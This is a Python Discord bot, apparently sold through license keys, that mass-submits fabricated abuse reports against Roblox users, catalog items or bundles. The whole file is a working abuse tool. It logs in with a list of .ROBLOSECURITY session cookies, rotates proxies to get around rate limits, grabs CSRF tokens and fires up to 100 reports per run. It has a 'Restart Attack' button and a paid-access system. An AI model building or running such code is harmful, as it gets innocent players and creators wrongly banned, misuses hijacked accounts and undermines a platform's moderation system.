import discord
from discord import app_commands
from discord.ext import commands
from discord.ui import View, Button
import aiohttp
import asyncio
import json
import os
import secrets
import string
import time
import re

TOKEN = ""
OWNERS = [122099949130350594]
DB_PATH = "database.json"
C_PATH = "cookies.txt"
P_PATH = "proxies.txt"
MAX_THREADS = 50

intents = discord.Intents.default()
client = commands.Bot(command_prefix=".", intents=intents)

def get_db():
    if not os.path.exists(DB_PATH):
        base = {"keys": {}, "users": {}, "blacklist": [], "protected_groups": []}
        with open(DB_PATH, "w") as f:
            json.dump(base, f)
        return base
    try:
        with open(DB_PATH, "r") as f:
            d = json.load(f)
            if "protected_groups" not in d:
                d["protected_groups"] = []
            return d
    except:
        return {"keys": {}, "users": {}, "blacklist": [], "protected_groups": []}

def write_db(payload):
    with open(DB_PATH, "w") as f:
        json.dump(payload, f, indent=4)

def read_lines(path):
    if not os.path.exists(path):
        open(path, "w").close()
        return []
    with open(path, "r", encoding="utf-8") as f:
        return [x.strip() for x in f if x.strip()]

def fmt_proxies(raw_list):
    clean = []
    for p in raw_list:
        if p.count(":") == 3:
            s = p.split(":")
            clean.append(f"http://{s[2]}:{s[3]}@{s[0]}:{s[1]}")
        elif not p.startswith("http"):
            clean.append(f"http://{p}")
        else:
            clean.append(p)
    return clean

class CageSession:
    def __init__(self, auth, net=None):
        self.auth = auth
        self.net = net
        self.s = None
        self.uid = None
        self.token = None
        self.h = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*"
        }

    async def start(self):
        opts = aiohttp.TCPConnector(ssl=False)
        self.s = aiohttp.ClientSession(
            cookies={".ROBLOSECURITY": self.auth},
            headers=self.h,
            connector=opts,
            timeout=aiohttp.ClientTimeout(total=15)
        )
        try:
            async with self.s.get("https://users.roblox.com/v1/users/authenticated", proxy=self.net) as r:
                if r.status != 200: return False
                js = await r.json()
                self.uid = str(js.get("id"))
            
            async with self.s.post("https://auth.roblox.com/v1/logout", proxy=self.net) as r:
                if r.status == 403:
                    self.token = r.headers.get("x-csrf-token")
                    return True
        except:
            return False
        return False

    async def kill(self):
        if self.s: await self.s.close()

    async def fetch_meta(self, tid, u_mode, b_mode):
        out = {"name": "Unknown", "type": None, "oid": None}
        try:
            if u_mode:
                u = f"https://users.roblox.com/v1/users/{tid}"
                async with self.s.get(u, proxy=self.net) as r:
                    if r.status == 200:
                        j = await r.json()
                        out.update({"name": j.get("name"), "type": "User"})
            elif b_mode:
                u = f"https://catalog.roblox.com/v1/bundles/{tid}/details"
                async with self.s.get(u, proxy=self.net) as r:
                    if r.status == 200:
                        j = await r.json()
                        out.update({"name": j.get("name"), "type": -1, "oid": j.get("creator", {}).get("id")})
            else:
                u = f"https://economy.roblox.com/v2/assets/{tid}/details"
                async with self.s.get(u, proxy=self.net) as r:
                    if r.status == 200:
                        j = await r.json()
                        out.update({"name": j.get("Name"), "type": j.get("AssetTypeId"), "oid": j.get("Creator", {}).get("CreatorTargetId")})
        except: pass
        return out

    async def fetch_img(self, tid, u_mode, b_mode):
        base = "https://thumbnails.roblox.com/v1"
        ep = ""
        if u_mode: ep = f"{base}/users/avatar-headshot?userIds={tid}&size=420x420&format=Png&isCircular=false"
        elif b_mode: ep = f"{base}/bundles/thumbnails?bundleIds={tid}&size=420x420&format=Png&isCircular=false"
        else: ep = f"{base}/assets?assetIds={tid}&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"
        
        try:
            async with self.s.get(ep, proxy=self.net) as r:
                if r.status == 200:
                    j = await r.json()
                    return j["data"][0].get("imageUrl")
        except: pass
        return None

    async def identify_vector(self, atype, u_mode, b_mode):
        if u_mode: return "userprofile"
        if b_mode: return "ugc_bundle"
        
        lookup = {
            2: "tshirt", 11: "shirt", 12: "pants", 8: "hat", 18: "face", 19: "gear",
            41: "hairaccessory", 42: "faceaccessory", 43: "neckaccessory", 44: "shoulderaccessory",
            45: "frontaccessory", 46: "backaccessory", 47: "waistaccessory", 10: "model",
            13: "decal", 3: "audio", 24: "animation", 61: "emoteanimation"
        }
        if atype in lookup: return lookup[atype]
        
        try:
            async with self.s.get("https://avatar.roblox.com/v1/avatar-rules", proxy=self.net) as r:
                if r.status == 200:
                    j = await r.json()
                    for x in j.get("wearableAssetTypes", []):
                        if x["id"] == atype:
                            v = x["name"].lower().replace(" ", "")
                            return "3d_accessory" if v == "emoteanimation" else v
        except: pass
        return "3d_accessory"

    async def push_report(self, tid, u_mode, b_mode, vec):
        if not self.token or not self.uid: return {"ok": False, "err": "No Auth"}
        
        p = {
            "tags": {
                "ENTRY_POINT": {"valueList": [{"data": "website"}]},
                "REPORTED_ABUSE_CATEGORY": {"valueList": [{"data": "Other Rule Violation"}]},
                "REPORTED_ABUSE_VECTOR": {"valueList": [{"data": vec}]},
                "REPORTER_COMMENT": {"valueList": [{"data": "Content violates community standards."}]},
                "SUBMITTER_USER_ID": {"valueList": [{"data": self.uid}]},
            }
        }

        if u_mode: p["tags"]["REPORT_TARGET_USER_ID"] = {"valueList": [{"data": tid}]}
        elif b_mode: p["tags"]["UGC_BUNDLE_ID"] = {"valueList": [{"data": tid}]}
        else: p["tags"]["REPORT_TARGET_ASSET_ID"] = {"valueList": [{"data": tid}]}

        h = self.h.copy()
        h.update({
            "X-CSRF-Token": self.token,
            "Content-Type": "application/json",
            "Referer": "https://www.roblox.com/"
        })

        try:
            u = "https://apis.roblox.com/abuse-reporting/v2/abuse-report"
            async with self.s.post(u, json=p, headers=h, proxy=self.net) as r:
                if r.status in [200, 201]: return {"ok": True}
                if r.status == 429: return {"ok": False, "err": "Ratelimit"}
                return {"ok": False, "err": f"Status {r.status}"}
        except Exception as e:
            return {"ok": False, "err": str(e)}

_lock = asyncio.Semaphore(MAX_THREADS)

async def task_wrapper(auth, tid, u_mode, b_mode, vec, net, trk):
    async with _lock:
        res = {"ok": False, "err": "Fail"}
        for _ in range(3):
            c = CageSession(auth, net)
            try:
                if await c.start():
                    res = await c.push_report(tid, u_mode, b_mode, vec)
                    if res["ok"]: break
                else:
                    res = {"ok": False, "err": "Login Error"}
            except Exception as e:
                res = {"ok": False, "err": str(e)}
            finally:
                await c.kill()
            
            if not res["ok"]: await asyncio.sleep(2)

        if trk: trk["done"] += 1
        return res

async def status_loop(inter, goal, trk):
    t0 = time.time()
    while trk["done"] < goal:
        await asyncio.sleep(5)
        diff = int(time.time() - t0)
        try:
            em = discord.Embed(
                description=f"Cage Bot Active\nProcessed: `{trk['done']}/{goal}`\nTime: `{diff}s`",
                color=0xFF0000
            )
            await inter.edit_original_response(embed=em)
        except: pass

async def executor(inter, tid, u_mode, b_mode, vec, count):
    clist = read_lines(C_PATH)
    if not clist: return []
    plist = fmt_proxies(read_lines(P_PATH))
    
    trk = {"done": 0}
    bg = asyncio.create_task(status_loop(inter, count, trk))
    
    jobs = []
    for i in range(count):
        c_use = clist[i % len(clist)]
        p_use = plist[i % len(plist)] if plist else None
        jobs.append(task_wrapper(c_use, tid, u_mode, b_mode, vec, p_use, trk))
        
    ret = await asyncio.gather(*jobs)
    bg.cancel()
    return ret

def parse_url(u):
    m = re.search(r"/(catalog|bundles|library|roblox.com/assets|users)/(\d+)", u)
    if not m: return None, False, False
    t, i = m.group(1), m.group(2)
    return i, "users" in t, "bundles" in t

class RetryUI(View):
    def __init__(self, tid, um, bm, vec, nm, img, oid, amt):
        super().__init__(timeout=None)
        self.d = (tid, um, bm, vec, nm, img, oid, amt)
        
        r_link = f"https://www.roblox.com/users/{tid}/profile" if um else (f"https://www.roblox.com/bundles/{tid}" if bm else f"https://www.roblox.com/catalog/{tid}")
        l_link = f"https://www.rolimons.com/player/{tid}" if um else f"https://www.rolimons.com/item/{tid}"
        
        self.add_item(Button(label="View on Roblox", url=r_link))
        self.add_item(Button(label="View on Rolimons", url=l_link))

    async def interaction_check(self, i: discord.Interaction):
        if i.user.id != self.d[6]:
            await i.response.send_message(embed=discord.Embed(description="Invalid User", color=0x990000), ephemeral=True)
            return False
        return True

    @discord.ui.button(label="Restart Attack", style=discord.ButtonStyle.red)
    async def reload(self, i: discord.Interaction, b: Button):
        await i.response.defer()
        tid, um, bm, vec, nm, img, oid, amt = self.d
        
        await i.followup.send(embed=discord.Embed(description=f"Reloading {amt} requests...", color=0xFF0000))
        out = await executor(i, tid, um, bm, vec, amt)
        
        s = sum(1 for x in out if x['ok'])
        f = sum(1 for x in out if not x['ok'])
        
        em = discord.Embed(title=nm, color=0x2f3136)
        if img: em.set_thumbnail(url=img)
        em.add_field(name="ID", value=tid)
        em.add_field(name="Type", value=vec)
        em.add_field(name="Passed", value=str(s))
        em.add_field(name="Failed", value=str(f))
        
        if f > 0:
            errs = list(set([x['err'] for x in out if not x['ok']]))
            txt = ", ".join(errs)
            em.set_footer(text=f"Failures: {txt[:90]}")
        else:
            em.set_footer(text="Task Completed")
            
        await i.edit_original_response(embed=em, view=self)

@client.event
async def on_ready():
    if not os.path.exists(DB_PATH): get_db()
    try:
        await client.tree.sync()
    except: pass
    print(f"Cage Bot Online: {client.user}")

@client.tree.command(name="genkey", description="Create license")
async def cmd_gen(i: discord.Interaction, days: int):
    if i.user.id not in OWNERS:
        return await i.response.send_message(embed=discord.Embed(description="No Access", color=0x000000), ephemeral=True)
    
    rnd = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
    k = f"CAGE-{rnd}"
    sec = -1 if days <= 0 else days * 86400
    
    d = get_db()
    d["keys"][k] = {"state": 0, "len": sec}
    write_db(d)
    
    dur = "Lifetime" if days <= 0 else f"{days} Days"
    await i.response.send_message(embed=discord.Embed(description=f"Key: `{k}`\nTime: {dur}", color=0x00FF00), ephemeral=True)

@client.tree.command(name="redeem", description="Claim license")
async def cmd_claim(i: discord.Interaction, key: str):
    d = get_db()
    uid = str(i.user.id)
    k = key.strip()
    
    if k in d["keys"] and d["keys"][k]["state"] == 0:
        length = d["keys"][k]["len"]
        now = int(time.time())
        curr = d["users"].get(uid, 0)
        
        if curr == -1:
            return await i.response.send_message(embed=discord.Embed(description="Already Lifetime", color=0xFF0000), ephemeral=True)
            
        new_t = -1 if length == -1 else (max(now, curr) + length)
        d["users"][uid] = new_t
        d["keys"][k]["state"] = 1
        d["keys"][k]["who"] = i.user.id
        write_db(d)
        
        msg = "Lifetime" if new_t == -1 else f"<t:{new_t}:R>"
        await i.response.send_message(embed=discord.Embed(description=f"Active until: {msg}", color=0x00FF00), ephemeral=True)
    else:
        await i.response.send_message(embed=discord.Embed(description="Bad Key", color=0xFF0000), ephemeral=True)

@client.tree.command(name="protect", description="Whitelist ID")
async def cmd_prot(i: discord.Interaction, target: int):
    if i.user.id not in OWNERS:
        return await i.response.send_message(embed=discord.Embed(description="No Access", color=0x000000), ephemeral=True)
    d = get_db()
    if target not in d["protected_groups"]:
        d["protected_groups"].append(target)
        write_db(d)
    await i.response.send_message(embed=discord.Embed(description=f"Protected {target}", color=0x00FF00), ephemeral=True)

@client.tree.command(name="unprotect", description="Remove Whitelist")
async def cmd_unprot(i: discord.Interaction, target: int):
    if i.user.id not in OWNERS:
        return await i.response.send_message(embed=discord.Embed(description="No Access", color=0x000000), ephemeral=True)
    d = get_db()
    if target in d["protected_groups"]:
        d["protected_groups"].remove(target)
        write_db(d)
    await i.response.send_message(embed=discord.Embed(description=f"Removed {target}", color=0x00FF00), ephemeral=True)

@client.tree.command(name="moderate", description="Mass report target")
async def cmd_mod(i: discord.Interaction, url: str, limit: int = None):
    d = get_db()
    uid = i.user.id
    
    if uid in d["blacklist"]: return
    
    allow = uid in OWNERS
    if not allow:
        exp = d["users"].get(str(uid))
        if exp and (exp == -1 or exp > time.time()): allow = True
            
    if not allow:
        return await i.response.send_message(embed=discord.Embed(description="Buy Access", color=0xFF0000), ephemeral=True)

    await i.response.defer()
    
    tid, um, bm = parse_url(url)
    if not tid:
        return await i.followup.send(embed=discord.Embed(description="Bad URL", color=0xFF0000))

    cookies = read_lines(C_PATH)
    if not cookies:
        return await i.followup.send(embed=discord.Embed(description="No Cookies", color=0xFF0000))

    amt = limit if limit and 0 < limit <= 100 else len(cookies)
    if amt > 100: amt = 100

    proxies = fmt_proxies(read_lines(P_PATH))
    p0 = proxies[0] if proxies else None

    test = CageSession(cookies[0], p0)
    if not await test.start():
        await test.kill()
        return await i.followup.send(embed=discord.Embed(description="Invalid Head Cookie", color=0xFF0000))

    meta = await test.fetch_meta(tid, um, bm)
    vec = await test.identify_vector(meta["type"], um, bm)
    img = await test.fetch_img(tid, um, bm)
    await test.kill()

    if meta["oid"] in d.get("protected_groups", []):
         return await i.followup.send(embed=discord.Embed(description=f"Target Protected: {meta['oid']}", color=0xFF0000))

    await i.followup.send(embed=discord.Embed(description=f"Target: {meta['name']} | Sending {amt}", color=0xFFFF00))
    
    res = await executor(i, tid, um, bm, vec, amt)
    
    suc = sum(1 for x in res if x['ok'])
    fail = sum(1 for x in res if not x['ok'])
    
    em = discord.Embed(title=meta["name"], color=0x2f3136)
    if img: em.set_thumbnail(url=img)
    em.add_field(name="Target", value=tid)
    em.add_field(name="Vector", value=vec)
    em.add_field(name="Success", value=str(suc))
    em.add_field(name="Fail", value=str(fail))

    if fail > 0:
        err_msg = ", ".join(set([r['err'] for r in res if not r['ok']]))
        em.set_footer(text=f"Errors: {err_msg[:95]}")
    else:
        em.set_footer(text="Clean Run")

    view = RetryUI(tid, um, bm, vec, meta["name"], img, i.user.id, amt)
    await i.edit_original_response(embed=em, view=view)

client.run(TOKEN)